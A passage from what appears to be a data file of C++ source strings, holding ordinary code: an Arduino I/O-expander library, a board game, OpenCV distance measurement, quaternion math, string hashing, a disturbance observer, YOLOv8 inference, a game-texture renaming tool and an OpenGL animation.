\");\n//\t\tDEBUG_PRINTLN(readMode, BIN);\n\t}else if(mode == INPUT_PULLUP){\n\t\twriteMode = writeMode & ~bit(pin);\n\t\treadMode =   readMode | bit(pin);\n\t}else{\n\t\tDEBUG_PRINTLN(\"Mode non supported by PCF8575\")\n\t}\n\tDEBUG_PRINT(\"Write mode: \");\n\tDEBUG_PRINTLN(writeMode, BIN);\n\n};\n\n/**\n * Read value from i2c and bufferize it\n * @param force\n */\nvoid PCF8575::readBuffer(uint8_t address, bool force){\n\tif (millis() > PCF8575::lastReadMillis+READ_ELAPSED_TIME || _usingInterrupt || force){\n\t\t_wire->requestFrom(address,(uint8_t)2);// Begin transmission to PCF8575 with the buttons\n\t\tlastReadMillis = millis();\n\t\tif(_wire->available())   // If uint16_ts are available to be recieved\n\t\t{\n\t\t\tuint16_t iInput = _wire->read();// Read a uint16_t\n\t\t\tiInput |= _wire->read() << 8;// Read a uint16_t\n\t\t\tif ((iInput & readMode)>0){\n\t\t\t\tbyteBuffered = byteBuffered | (uint16_t)iInput;\n\t\t\t}\n\t\t}\n\t}\n}\n\n#ifndef PCF8575_LOW_MEMORY\n\t/**\n\t * Read value of all INPUT pin\n\t * Debounce read more fast than 10millis, non managed for interrupt mode\n\t * @return\n\t */\n\tPCF8575::DigitalInput PCF8575::digitalReadAll(uint8_t address){\n\t\tDEBUG_PRINTLN(\"Read from buffer\");\n\t\t_wire->requestFrom(address,(uint8_t)2);// Begin transmission to PCF8575 with the buttons\n\t\tlastReadMillis = millis();\n\t\tif(_wire->available())   // If uint16_ts are available to be recieved\n\t\t{\n\t\t\t  DEBUG_PRINTLN(\"Data ready\");\n\t\t\t  uint16_t iInput = _wire->read();// Read a uint16_t\n\t\t\t\tiInput |= _wire->read() << 8;// Read a uint16_t\n\n\t\t\t  if ((iInput & readMode)>0){\n\t\t\t\t  DEBUG_PRINT(\"Input \");\n\t\t\t\t  DEBUG_PRINTLN((uint16_t)iInput, BIN);\n\n\t\t\t\t  byteBuffered = byteBuffered | (uint16_t)iInput;\n\t\t\t\t  DEBUG_PRINT(\"byteBuffered \");\n\t\t\t\t  DEBUG_PRINTLN(byteBuffered, BIN);\n\t\t\t  }\n\t\t}\n\n\t\tDEBUG_PRINT(\"Buffer value \");\n\t\tDEBUG_PRINTLN(byteBuffered, BIN);\n#ifdef NOT_SEQUENTIAL_PINOUT\n\t\tif ((bit(0) & readMode)>0) digitalInput.p00 = ((byteBuffered & bit(0))>0)?HIGH:LOW;\n\t\tif ((bit(1) & readMode)>0) digitalInput.p01 = ((byteBuffered & bit(1))>0)?HIGH:LOW;\n\t\tif ((bit(2) & readMode)>0) digitalInput.p02 = ((byteBuffered & bit(2))>0)?HIGH:LOW;\n\t\tif ((bit(3) & readMode)>0) digitalInput.p03 = ((byteBuffered & bit(3))>0)?HIGH:LOW;\n\t\tif ((bit(4) & readMode)>0) digitalInput.p04 = ((byteBuffered & bit(4))>0)?HIGH:LOW;\n\t\tif ((bit(5) & readMode)>0) digitalInput.p05 = ((byteBuffered & bit(5))>0)?HIGH:LOW;\n\t\tif ((bit(6) & readMode)>0) digitalInput.p06 = ((byteBuffered & bit(6))>0)?HIGH:LOW;\n\t\tif ((bit(7) & readMode)>0) di",
    "#include \"MyGame.h\"\n\nMyGame::MyGame(int numTiles, int numSnakes, int numLadders, int penalty, int reward, int numPlayers, int maxTurns, char gameType)\n    : board(numTiles, numSnakes, numLadders, penalty, reward), turn(1), gameOver(false) {\n    for (int i = 1; i <= numPlayers; ++i) {\n        players.push_back(Player(i));\n    }\n    if (gameType == 'A') {\n        gameMode = new AutomaticGame();\n    } else {\n        gameMode = new ManualGame();\n    }\n}\n\nMyGame::~MyGame() {\n    delete gameMode;\n}\n\nvoid MyGame::start() {\n    gameMode->start(*this);\n}\n\nvoid MyGame::playTurn() {\n    Player& currentPlayer = players[turn % players.size()];\n    int currentTurn = turn++;\n    int currentPosition = currentPlayer.getPosition();\n    int diceRoll = dice.roll();\n    int newPosition = currentPosition + diceRoll;\n\n    Tile* newTile = board.getTile(newPosition);\n    char tileType = newTile ? newTile->getType() : 'N';\n    newPosition = newTile ? newTile->action(newPosition) : newPosition;\n\n    currentPlayer.setPosition(newPosition);\n    printTurnInfo(currentTurn, currentPlayer.getId(), currentPosition, diceRoll, tileType, newPosition);\n\n    if (newPosition >= board.getTile(newPosition)->getPosition()) {\n        cout << \"-- GAME OVER --\" << endl;\n        cout << \"Player \" << currentPlayer.getId() << \" is the winner!!!\" << endl;\n        gameOver = true;\n    }\n}\n\nvoid MyGame::printTurnInfo(int turn, int playerId, int currentPosition, int diceRoll, char tileType, int finalPosition) {\n    cout << turn << \" \" << playerId << \" \" << currentPosition << \" \" << diceRoll << \" \" << tileType << \" \" << finalPosition << endl;\n}\n\nvoid MyGame::endGame() {\n    cout << \"Thanks for playing!!!\" << endl;\n    gameOver = true;\n}\n",
    "// \u5355\u76ee\u6d4b\u8ddd.cpp: \u5b9a\u4e49\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n//\n\n#include <stdio.h>\n#include <tchar.h>\n#include \"opencv2/opencv.hpp\"\n#include <iostream>\n#include <stdio.h>\n#include <vector>\n#include <opencv2/imgcodecs.hpp>\n#include <opencv2/highgui.hpp>\n#include <opencv2/imgproc.hpp>\n\n// \u5355\u4f4d\u50cf\u7d20\u5bbd/\u9ad8(cm/pixel)\n#define UNIT_PIXEL_W 0.0008234375\n#define UNIT_PIXEL_H 0.000825\n\nusing namespace std;\nusing namespace cv;\nint main(void)\n{\n\tMat frame;\n\tVideoCapture capture(0);\n\n\tconst double f = 0.35;  // \u7126\u8ddd\n\tconst double w = 8.5;   // \u88ab\u6d4b\u7269\u4f53\u5bbd\u5ea6\n\tconst double h = 5.6;   // \u88ab\u6d4b\u7269\u4f53\u9ad8\u5ea6\n\n\tif (!capture.isOpened()) {\n\t\tprintf(\"The camera is not opened.\\n\");\n\t\treturn EXIT_FAILURE;\n\t}\n\n\twhile(1) {\n\t\t//capture >> frame;\u7b49\u4ef7\n\t\tcapture.read(frame);\n\t\tif (frame.empty()) {\n\t\t\tprintf(\"The frame is empty.\\n\");\n\t\t\tbreak;\n\t\t}\n\t\tmedianBlur(frame, frame, 3);//\u4e2d\u503c\u6ee4\u6ce2 \u5377\u79ef\u68383\n\n\t\tMat grayImage;\n\t\tcvtColor(frame, grayImage, cv::COLOR_BGR2GRAY);\n\t\t// otsu \u53ef\u4ee5\u6362\u7528\u52a8\u6001\u9608\u503c\n\t\tthreshold(grayImage, grayImage, NULL, 255,THRESH_BINARY |THRESH_OTSU);\n\n\t\tvector<vector<Point>> contours;\n\t\tvector<Point> maxAreaContour;\n\n\t\tfindContours(grayImage, contours, RETR_EXTERNAL, CHAIN_APPROX_SIMPLE);\n\n\t\t//cv::drawContours(frame, contours, -1, cv::Scalar(0, 0, 255), 2, 8);\n\n\t\t// \u63d0\u53d6\u9762\u79ef\u6700\u5927\u8f6e\u5ed3\n\t\tdouble maxArea = 0;\n\t\tfor (size_t i = 0; i < contours.size(); i++) {\n\t\t\tdouble area = fabs(cv::contourArea(contours[i]));\n\t\t\tif (area > maxArea) {\n\t\t\t\tmaxArea = area;\n\t\t\t\tmaxAreaContour = contours[i];\n\t\t\t}\n\t\t}\n\t\t// \u8f6e\u5ed3\u5916\u5305\u6b63\u77e9\u5f62\n\t\tRect rect = boundingRect(maxAreaContour);\n\t\trectangle(frame, Point(rect.x, rect.y), Point(rect.x + rect.width, rect.y + rect.height),Scalar(255, 0, 0), 2, 8);\n\n\t\t// \u8ba1\u7b97\u6210\u50cf\u5bbd/\u9ad8\n\t\tdouble width = rect.width * UNIT_PIXEL_W;\n\t\tdouble height = rect.height * UNIT_PIXEL_H;\n\t\t// \u5206\u522b\u4ee5\u5bbd/\u9ad8\u4e3a\u6807\u51c6\u8ba1\u7b97\u8ddd\u79bb\n\t\tdouble distanceW = w * f / width;\n\t\tdouble distanceH = h * f / height;\n\n\t\tchar disW[50], disH[50];\n\t\tsprintf_s(disW, \"DistanceW : %.2fcm\", distanceW);\n\t\tsprintf_s(disH, \"DistanceH : %.2fcm\", distanceH);\n\t\tputText(frame, disW, cv::Point(5, 20), FONT_HERSHEY_COMPLEX_SMALL, 1, Scalar(0, 255, 0), 1, 8);\n\t\tputText(frame, disH, cv::Point(5, 40), FONT_HERSHEY_COMPLEX_SMALL, 1, Scalar(0, 255, 0), 1, 8);\n\n\t\timshow(\"Frame\", frame);\n\t\timshow(\"Gray\", grayImage);\n\t\tif ((waitKey(10) & 0XFF) == 27) break;\n\t}\n\tcv::destroyAllWindows();\n\tcapture.release();\n\n\treturn EXIT_SUCCESS;\n}\n",
    "#include \"PcHeader.h\"\n\n#include \"Trace.h\"\n#include \"TraceMath.h\"\n#include \"SystemTrace.h\"\n\n#include \"Quaternion.h\"\n#include \"QuaternionTool.h\"\n\nnamespace math\n{\n\nQuaternion::Quaternion()\n{\n\tClear();\n}\n\nQuaternion::Quaternion(double p_E, double p_I, double p_J, double p_K)\n{\n\tSet(p_E,p_I,p_J,p_K);\n}\n\nQuaternion::Quaternion(const Quaternion& p_gr)\n{\n\t(*this) = p_gr;\n}\n\nvoid Quaternion::Clear()\n{\n\tSet(0,0,0,0);\n}\n\nvoid Quaternion::Set(double p_E, double p_I, double p_J, double p_K)\n{\n\tE = p_E;\n\tI = p_I;\n\tJ = p_J;\n\tK = p_K;\n}\n\nQuaternion& Quaternion::operator=(const Quaternion& p_gr)\n{\n\tSet(p_gr.E,p_gr.I,p_gr.J,p_gr.K);\n\treturn (*this);\n}\n\nQuaternion Quaternion::operator+(Quaternion& p_gr)\n{\n\tQuaternion qRes;\n\tqRes.Set(E+p_gr.E,I+p_gr.I,J+p_gr.J,K+p_gr.K);\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator-(Quaternion& p_gr)\n{\n\tQuaternion qRes;\n\tqRes.Set(E-p_gr.E,I-p_gr.I,J-p_gr.J,K-p_gr.K);\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator*(Quaternion& p_gr)\n{\n\tQuaternion qRes;\n\n\tqRes.E\t= E*p_gr.E - I*p_gr.I - J*p_gr.J - K*p_gr.K;\n\tqRes.I\t= E*p_gr.I + I*p_gr.E + J*p_gr.K - K*p_gr.J;\n\tqRes.J\t= E*p_gr.J - I*p_gr.K + J*p_gr.E + K*p_gr.I;\n\tqRes.K\t= E*p_gr.K + I*p_gr.J - J*p_gr.I + K*p_gr.E;\n\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator/(Quaternion& p_gr)\n{\n\tQuaternion qRes;\n\n\tqRes = (*this) * Inverse(p_gr);\n\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator+(double p_d)\n{\n\tQuaternion qRes;\n\n\tqRes\t= (*this);\n\tqRes.E\t+= p_d;\n\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator-(double p_d)\n{\n\tQuaternion qRes;\n\n\tqRes\t= (*this);\n\tqRes.E\t-= p_d;\n\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator*(double p_d)\n{\n\tQuaternion qRes;\n\n\tqRes.Set(E*p_d,I*p_d,J*p_d,K*p_d);\n\n\treturn qRes;\n}\n\nQuaternion Quaternion::operator/(double p_d)\n{\n\tQuaternion qRes;\n\n\tdouble d = 1.0/p_d;\n\tqRes.Set(E*d,I*d,J*d,K*d);\n\n\treturn qRes;\n}\n\n}// namespace",
    "#include<bits/stdc++.h>\r\n#define  ll  long long\r\n#define  pr priority_queue<int>\r\n#define vll vector<ll>\r\n#define vvll vector<vll>\r\n#define all(vc) ((vc).begin()), ((vc).end())\r\n#define Hakuna_Matata ios_base::sync_with_stdio(false),cout.tie(NULL),cin.tie(NULL);\r\n#define vvll vector<vll>\r\n#define inf 1000000000000000\r\n#define low lower_bound(arr, arr + n, x)\r\nusing namespace std;\r\ntemplate < typename T = int > using Pair = pair < T, T >;\r\nconst int N=1e6+7;\r\ntemplate < typename T = int > istream& operator >> (istream &in, vector < T > &v) {\r\n    for (auto &x: v) in >> x;\r\n    return in;\r\n}\r\ntemplate < typename T = int > ostream& operator << (ostream &out, const vector < T > &v) {\r\n    for (const T &x: v) out << x << ' ';\r\n    return out;\r\n}\r\n\r\nvector<ll>pw1(N),pw2(N);\r\nvector<Pair<ll>>pre(N);\r\nll mod1=1e9+7,mod2=2e9+11,base1=31,base2=37,inv1,inv2;\r\nll fpow(ll x,ll y,ll mod){\r\n    ll prod = x,ans = 1;\r\n    while(y){\r\n        if(y&1)ans*=prod,ans%=mod;\r\n        prod*=prod;\r\n        prod%=mod;\r\n        y>>=1;\r\n    }\r\n    return ans;\r\n}\r\nvoid init(){\r\n    inv1=fpow(base1,mod1-2,mod1);\r\n    inv2=fpow(base2,mod2-2,mod2);\r\n    pw1[0]=pw2[0]=1;\r\n    for(int i=1;i<N;i++){\r\n        pw1[i]=(pw1[i-1]*base1)%mod1;\r\n        pw2[i]=(pw2[i-1]*base2)%mod2;\r\n    }\r\n\r\n}\r\nstruct Hashing{\r\n    int len;\r\n    ll h1,h2,v;\r\n    deque<char>d;\r\n    Hashing(){\r\n        h1=h2=len=0;\r\n    }\r\n    void push_back(char c){\r\n        v=c-'a'+1;\r\n        h1=(h1*base1+v)%mod1;\r\n        h2=(h2*base2+v)%mod2;\r\n        d.push_back(c);\r\n        len++;\r\n    }\r\n    void push_front(char c){\r\n        v=c-'a'+1;\r\n        h1=(pw1[len]*v+h1)%mod1;\r\n        h2=(pw2[len]*v+h2)%mod2;\r\n        d.push_front(c);\r\n        len++;\r\n    }\r\n    void pop_back(){\r\n        if(!len)return;\r\n        v=d.back()-'a'+1;\r\n        h1=(h1-v+mod1)%mod1;\r\n        h1=(h1*inv1)%mod1;\r\n        h2=(h2-v+mod2)%mod2;\r\n        h2=(h2*inv2)%mod2;\r\n        len--;\r\n        d.pop_back();\r\n    }\r\n    void pop_front(){\r\n        if(!len)return;\r\n        v=d.front()-'a'+1;\r\n        h1=((h1-v*pw1[len-1])%mod1+mod1)%mod1;\r\n        h2=((h2-v*pw2[len-1])%mod2+mod2)%mod2;\r\n        len--;\r\n        d.pop_front();\r\n    }\r\n    void clear(){\r\n        h1=h2=len=0;\r\n        d.clear();\r\n    }\r\n    pair<ll,ll>get(){\r\n        return {h1,h2};\r\n    }\r\n    pair<ll,ll> get_sub(int l,int r){\r\n        ll a=((pre[r].first-(pw1[r-l+1]*pre[l-1].first))%mod1+mod1)%mod1;\r\n        ll b=((pre[r].second-(pw2[r-l+1]*pre[l-1].second))%mod2+mod2)%mod2;\r\n        return {a,b};\r\n    }\r\n};\r\n\r\nvoid solve(){\r\n    init();\r\n\r\n   //cin>>n>>m;\r\n   string s1,s2;\r\n   cin>>s1>>s2;int n=s1.size(),m=s2.size();\r\n   Hashing H1,H2;\r\n   for(int i=0;i<n;i++){\r\n         H1.push_back(s1[i]);\r\n         pre[i+1]=H1.get();\r\n     }\r\n     for(int i=0;i<m;i++){\r\n         H2.push_back(s2[i]);\r\n\r\n     }\r\n     pair<int,int> vl1=H2.get();\r\n     int ans=0;\r\n     for(int i=1;i+m-1<=n;i++){\r\n          pair<int,int>vl2=H1.get_sub(i,i+m-1);\r\n          if(vl2==vl1){\r\n              ans++;\r\n          }\r\n     }\r\n     cout<<ans;\r\n\r\n}\r\n\r\nint main()\r\n{\r\n\r\n    Hakuna_Matata;\r\n   int t=1;\r\n   //cin>>t;\r\n   while(t--){\r\n   solve();\r\n   }\r\n    return 0;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n// 1 2\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "/**\r\n\tQDOB - Quasi-periodic Disturbance Observer\r\n\t@author: Hisayoshi Muramatsu\r\n\t@date: 2024.06.04\r\n*/\r\n\r\n#include <vector>\r\n#include <math.h>\r\n\r\n#include \"Delay.cpp\"\r\n#include \"QDOB.hpp\"\r\n\r\nQDOB::QDOB(\r\n\t\tint mu_int,\r\n\t\tint l,\r\n\t\tint Nmax,\r\n\t\tdouble wa,\r\n\t\tdouble wb,\r\n\t\tdouble wc,\r\n\t\tdouble L,\r\n\t\tdouble M,\r\n\t\tdouble T\r\n\t):mu((double)mu_int), l(l), N(Nmax), wb(wb), L(L), M(M), T(T), p((2/L)*tan(L*wc/2)), eta(0), y{}, lam{}, xi{}, U(l), bU(l), theta(l), gamma(l), w(l), ThDelay(l), LamDelay(nullptr)\r\n{\r\n\tconst int bL = (int)round(L/T);\r\n\tconst double c = 0.5*pow( (T*wa/M_PI) , 1.0/(double)l );\r\n\r\n\tfor(int i(0);i<l;i++){\r\n\t\tif(i==0){\r\n\t\t\tU[i] = T;\r\n\t\t}else{\r\n\t\t\tU[i] = M_PI/w[i-1];\r\n\t\t}\r\n\t\tbU[i] = (int)round(U[i]/T);\r\n\t\tw[i]  = 2*M_PI*c/U[i];\r\n\t}\r\n\r\n\tint bUsum(0);\r\n\t\tfor(int i(0);i<l;i++) bUsum += bU[i];\r\n\tN = std::min( (int)floor((double)(bL-1)/(double)bUsum) , Nmax );\r\n\r\n\teta = bL - N*bUsum;\r\n\r\n\tfor(int i(0);i<l;i++) ThDelay[i] = new Delay(2*bL);\r\n\tLamDelay = new Delay(eta);\r\n}\r\n\r\nQDOB::~QDOB(){\r\n\tfor(int i(0);i<l;i++) delete ThDelay[i];\r\n\tdelete LamDelay;\r\n}\r\n\r\ndouble QDOB::Ctrl(double& hd, const double& r, const double& y_){\r\n\tfor(int i(0); i<2; i++){\r\n\t\ty[2-i] = y[1-i];\r\n\t\tlam[2-i] = lam[1-i];\r\n\t}\r\n\ty[0] = y_;\r\n\txi[1]=xi[0];\r\n\r\n\txi[0]  = ( 1 / (T*(1+wb*T)) ) * ( T*xi[1] + M*wb*(y[0]-2*y[1]+y[2]) );\r\n\thd     = ( p*L / ((1-mu)*p*L+2) ) * (xi[0]-r) + fun_P(lam[1]);\r\n\tlam[0] = ( p*L / ((1-mu)*p*L+2) ) * (xi[0]-r) - ( ((1-mu)*p*L-2) / ((1-mu)*p*L+2) ) * hd;\r\n\r\n\treturn r - mu*hd;\r\n}\r\n\r\ndouble QDOB::fun_P(const double& lam_k1){\r\n\tconst double theta0 = LamDelay->Memory(lam_k1,1-eta);\r\n\t\tLamDelay->Update(lam_k1);\r\n\tfor(int i(0);i<l;i++){\r\n\t\ttheta[i]=0;\r\n\t\tgamma[i]=0;\r\n\t\tfor(int n(-N); n<=N; n++){\r\n\t\t\tif(i==0){\r\n\t\t\t\ttheta[i] += sub_w(n,N)*sub_h(n,w[i],U[i])*ThDelay[i]->Memory(theta0,(n-N)*bU[i]);\r\n\t\t\t}else{\r\n\t\t\t\ttheta[i] += sub_w(n,N)*sub_h(n,w[i],U[i])*ThDelay[i]->Memory(theta[i-1],(n-N)*bU[i]);\r\n\t\t\t}\r\n\t\t\tgamma[i] += sub_w(n,N)*sub_h(n,w[i],U[i]);\r\n\t\t}\r\n\t\tif(i==0){\r\n\t\t\tThDelay[i]->Update(theta0);\r\n\t\t}else{\r\n\t\t\tThDelay[i]->Update(theta[i-1]);\r\n\t\t}\r\n\t\ttheta[i]=theta[i]/gamma[i];\r\n\t}\r\n\treturn theta[l-1];\r\n}\r\n\r\ndouble QDOB::sub_h(const int& n, const double& wi, const double& Ui){\r\n\tif(n==0){\r\n\t\treturn Ui*wi/M_PI;\r\n\t}else{\r\n\t\treturn sin((double)n*Ui*wi)/((double)n*M_PI);\r\n\t}\r\n}\r\n\r\ndouble QDOB::sub_w(const int& n, const int& N){\r\n\treturn 0.42 + 0.5*cos((double)n*M_PI/(double)N) + 0.08*cos(2*(double)n*M_PI/(double)N);\r\n}\r\n",
    "//\n// Created by  triple-Mu     on 24-1-2023.\n// Modified by Q-engineering on  6-3-2024\n//\n\n#include \"yolov8.hpp\"\n#include <cuda_runtime_api.h>\n#include <cuda.h>\n\n//----------------------------------------------------------------------------------------\n//using namespace det;\n//----------------------------------------------------------------------------------------\nconst char* class_names[] = {\n    \"person\", \"bicycle\", \"car\", \"motorcycle\", \"airplane\", \"bus\", \"train\", \"truck\", \"boat\", \"traffic light\",\n    \"fire hydrant\", \"stop sign\", \"parking meter\", \"bench\", \"bird\", \"cat\", \"dog\", \"horse\", \"sheep\", \"cow\",\n    \"elephant\", \"bear\", \"zebra\", \"giraffe\", \"backpack\", \"umbrella\", \"handbag\", \"tie\", \"suitcase\", \"frisbee\",\n    \"skis\", \"snowboard\", \"sports ball\", \"kite\", \"baseball bat\", \"baseball glove\", \"skateboard\", \"surfboard\",\n    \"tennis racket\", \"bottle\", \"wine glass\", \"cup\", \"fork\", \"knife\", \"spoon\", \"bowl\", \"banana\", \"apple\",\n    \"sandwich\", \"orange\", \"broccoli\", \"carrot\", \"hot dog\", \"pizza\", \"donut\", \"cake\", \"chair\", \"couch\",\n    \"potted plant\", \"bed\", \"dining table\", \"toilet\", \"tv\", \"laptop\", \"mouse\", \"remote\", \"keyboard\", \"cell phone\",\n    \"microwave\", \"oven\", \"toaster\", \"sink\", \"refrigerator\", \"book\", \"clock\", \"vase\", \"scissors\", \"teddy bear\",\n    \"hair drier\", \"toothbrush\"\n};\n//----------------------------------------------------------------------------------------\nYOLOv8::YOLOv8(const std::string& engine_file_path)\n{\n    std::ifstream file(engine_file_path, std::ios::binary);\n    assert(file.good());\n    file.seekg(0, std::ios::end);\n    auto size = file.tellg();\n    file.seekg(0, std::ios::beg);\n    char* trtModelStream = new char[size];\n    assert(trtModelStream);\n    file.read(trtModelStream, size);\n    file.close();\n    initLibNvInferPlugins(&this->gLogger, \"\");\n    this->runtime = nvinfer1::createInferRuntime(this->gLogger);\n    assert(this->runtime != nullptr);\n\n    this->engine = this->runtime->deserializeCudaEngine(trtModelStream, size);\n    assert(this->engine != nullptr);\n    delete[] trtModelStream;\n    this->context = this->engine->createExecutionContext();\n\n    assert(this->context != nullptr);\n    cudaStreamCreate(&this->stream);\n    this->num_bindings = this->engine->getNbBindings();\n\n    for (int i = 0; i < this->num_bindings; ++i) {\n        Binding            binding;\n        nvinfer1::Dims     dims;\n        nvinfer1::DataType dtype = this->engine->getBindingDataType(i);\n        std::string        name  = this->engine->getBindingName(i);\n        binding.name             = name;\n        binding.dsize            = type_to_size(dtype);\n\n        bool IsInput = engine->bindingIsInput(i);\n        if (IsInput) {\n            this->num_inputs += 1;\n            dims         = this->engine->getProfileDimensions(i, 0, nvinfer1::OptProfileSelector::kMAX);\n            binding.size = get_size_by_dims(dims);\n            binding.dims = dims;\n            this->input_bindings.push_back(binding);\n            // set max opt shape\n            this->context->setBindingDimensions(i, dims);\n        }\n        else {\n            dims         = this->context->getBindingDimensions(i);\n            binding.size = get_size_by_dims(dims);\n            binding.dims = dims;\n            this->output_bindings.push_back(binding);\n            this->num_outputs += 1;\n        }\n    }\n}\n//----------------------------------------------------------------------------------------\nYOLOv8::~YOLOv8()\n{\n    this->context->destroy();\n    this->engine->destroy();\n    this->runtime->destroy();\n    cudaStreamDestroy(this->stream);\n    for (auto& ptr : this->device_ptrs) {\n        CHECK(cudaFree(ptr));\n    }\n\n    for (auto& ptr : this->host_ptrs) {\n        CHECK(cudaFreeHost(ptr));\n    }\n}\n//----------------------------------------------------------------------------------------\nvoid YOLOv8::MakePipe(bool warmup)\n{\n#ifndef CUDART_VERSION\n#error CUDART_VERSION Undefined!\n#endif\n\n    for (auto& bindings : this->input_bindings) {\n        void* d_ptr;\n#if(CUDART_VERSION < 11000)\n        CHECK(cudaMalloc(&d_ptr, bindings.size * bindings.dsize));\n#else\n        CHECK(cudaMallocAsync(&d_ptr, bindings.size * bindings.dsize, this->stream));\n#endif\n        this->device_ptrs.push_back(d_ptr);\n    }\n\n    for (auto& bindings : this->output_bindings) {\n        void * d_ptr, *h_ptr;\n        size_t size = bindings.size * bindings.dsize;\n#if(CUDART_VERSION < 11000)\n        CHECK(cudaMalloc(&d_ptr, bindings.size * bindings.dsize));\n#else\n        CHECK(cudaMallocAsync(&d_ptr, bindings.size * bindings.dsize, this->stream));\n#endif\n        CHECK(cudaHostAlloc(&h_ptr, size, 0));\n        this->device_ptrs.push_back(d_ptr);\n        this->host_ptrs.push_back(h_ptr);\n    }\n\n    if (warmup) {\n        for (int i = 0; i < 10; i++) {\n            for (auto& bindings : this->input_bindings) {\n                size_t size  = bindings.size * bindings.dsize;\n                void*  h_ptr = malloc(size);\n                memset(h_ptr, 0, size);\n                CHECK(cudaMemcpyAsync(t",
    "/*\r\n    SotC_PALtoNTSC, by Etienne B\u00e9gu\u00e9 - www.txori.com\r\n    Convert Shadow of the Colossus' remastered texture by Sad Origami\r\n    from PAL (SCES-53326) to NTSC (SCUS-97472) version\r\n\r\n    Compile using w64devkit (https://github.com/skeeto/w64devkit):\r\n    g++ -O3 -std=c++17 -o SotC_PALtoNTSC.exe SotC_PALtoNTSC.cpp\r\n*/\r\n\r\n#include <iostream>\r\n#include <filesystem>\r\n#include <string>\r\n\r\n// Folder paths\r\nconst std::string SOURCE_DIR = \"SCES-53326/replacements\";\r\nconst std::string DESTINATION_DIR = \"SCUS-97472/replacements\";\r\n\r\nnamespace fs = std::filesystem;\r\n\r\n// Function to display an exit message and wait for user input\r\nvoid exitMessage() {\r\n    std::cout << std::endl;\r\n    std::cout << \"Press any key to exit\" << std::endl;\r\n#ifdef _WIN32\r\n    system(\"pause >nul\");\r\n#else\r\n    system(\"read -n 1 -s -r -p \\\"\\\"\");\r\n#endif\r\n}\r\n\r\n// Function to convert dds file nomenclature from PAL to NTSC\r\nstd::string convertFileName(const std::string& filename) {\r\n    std::string prefix = filename.substr(0, filename.size() - 8); // Remove the last 8 characters\r\n    int middleNum = filename[filename.size() - 8] - '0' - 4; // Convert middle character to integer and subtract 4\r\n    std::string newMiddleChar = std::to_string(middleNum); // Convert the result back to string\r\n    std::string suffix = filename.substr(filename.size() - 7); // Get the last 7 characters\r\n    return prefix + newMiddleChar + suffix; // Assemble the new filename\r\n}\r\n\r\nvoid copyAndRenameFiles(const std::string& sourceDir, const std::string& destinationDir) {\r\n    if (!fs::exists(sourceDir)) {\r\n        std::cerr << \"Error: Source directory '\" << sourceDir << \"' does not exist.\" << std::endl;\r\n        exitMessage();\r\n    }\r\n\r\n    for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {\r\n        if (entry.is_regular_file()) {\r\n            std::string sourceFilePath = entry.path().string();\r\n            std::string relativePath = entry.path().lexically_relative(fs::path(sourceDir)).string();\r\n\r\n            // Skip files in \"5) Bonus Material\" folder that aren't present in the NTSC version\r\n            if (sourceFilePath.find(\"5) Bonus Material\") != std::string::npos) {\r\n                continue;\r\n            }\r\n\r\n            std::string newFilename = convertFileName(entry.path().filename().string());\r\n            std::string relativeDir = entry.path().parent_path().lexically_relative(fs::path(sourceDir)).string();\r\n            std::string destinationFilePath = (fs::path(destinationDir) / fs::path(relativeDir) / newFilename).string();\r\n\r\n            std::cout << sourceFilePath << std::endl;\r\n\r\n            try {\r\n                fs::create_directories(fs::path(destinationFilePath).parent_path());\r\n                if (fs::exists(destinationFilePath)) {\r\n                    fs::remove(destinationFilePath);\r\n                }\r\n                fs::copy_file(sourceFilePath, destinationFilePath, fs::copy_options::overwrite_existing);\r\n            } catch (const std::exception& e) {\r\n                std::cerr << \"Error copying file: \" << e.what() << std::endl;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    copyAndRenameFiles(SOURCE_DIR, DESTINATION_DIR);\r\n    exitMessage();\r\n    return 0;\r\n}\r\n",
    "#include<GL/glut.h>\n#include<math.h>\nfloat r = 1.0f, g = 0.0f, b = 0.0f;\nfloat tx = 0, ty = -15, tz = 0;\nfloat xr = 0.001, angle = 180.0f, rr = 0.001;\nvoid init() {\n\tglClearColor(1, 1, 1, 1);\n\tglMatrixMode(GL_PROJECTION);\n\tglOrtho(-20, 20, -20, 20, -20, 20);\n\tglEnable(GL_DEPTH);\n\n}\nvoid display() {\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\t//glRotatef(angle, 0, 0, 1);\n\tglPushMatrix();\n\tglColor3f(0, 1, 0);\n\tglTranslatef(0, 10, 0);\n\tglScalef(2,1,1);\n\tglutSolidCube(2);\n\n\tglPopMatrix();\n\t//the mover\n\t\n\tglPushMatrix();\n\tglTranslatef(0, 9, 0);\n\tglRotatef(angle, 0, 0, 1);\n\t//the swing\n\tglPushMatrix();\n\tglColor3f(0.7, 0.7, 0.7);\n\tglTranslatef(0, 9, 0);\n\tglScalef(0.5, 3, 1);\n\tglRotatef(90, 1, 0, 0);\n\tGLUquadric* tri = gluNewQuadric();\n\tgluCylinder(tri, 1, 1, 3, 32, 32);\n\tglPopMatrix();\n\n\t//the cube\n\tglPushMatrix();\n\tglTranslatef(0,8,0);\n\tglColor3f(0, 0, 1);\n\tglutSolidCube(2);\n\tglPopMatrix();\n\t//the mover\n\t\n\tglPopMatrix();\n\n\n\tglFlush();\n\n\n\n\n}\nvoid keyPress(unsigned char key, int x, int y) {\n\tswitch (key)\n\t{\n\t\n\tcase 'f':\n\t\txr = xr + 0.005;\n\t\tbreak;\n\tcase 's':\n\t\txr = xr - 0.005;\n\t\tbreak;\n\tcase 'p':\n\t\txr = 0;\n\t\tangle = 180.0;\n\t\tbreak;\n\tcase 'q':\n\t\txr = 0.05;\n\t\tbreak;\n\n\t}\n\tglutPostRedisplay();\n}\nvoid animate() {\n\n\trr = 2*xr;\n\n\tif (angle<260) {\n\t\tangle = angle + xr;\n\n\n\n\t}\n\telse {\n\t\tangle = 